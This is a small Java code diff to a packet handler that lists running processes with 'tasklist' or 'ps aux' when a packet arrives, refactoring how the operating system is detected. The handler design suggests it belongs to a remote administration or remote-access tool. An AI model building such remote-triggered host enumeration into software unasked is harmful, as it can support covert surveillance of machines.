@@ -15,7 +15,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 	public void read() throws Exception {
 		try {
 			Process p = null;
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
 			} else {
 				p = Runtime.getRuntime().exec("ps aux");
@@ -24,7 +24,7 @@ public class Packet19ListProcesses extends AbstractIncomingPacket {
 			if (p != null) {
 				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
 
-				if (OperatingSystem.getOperatingSystem() != OperatingSystem.WINDOWS) {
+				if (OperatingSystem.getOperatingSystem().getType() != OperatingSystem.WINDOWS) {
 					reader.readLine();
 				}
 				
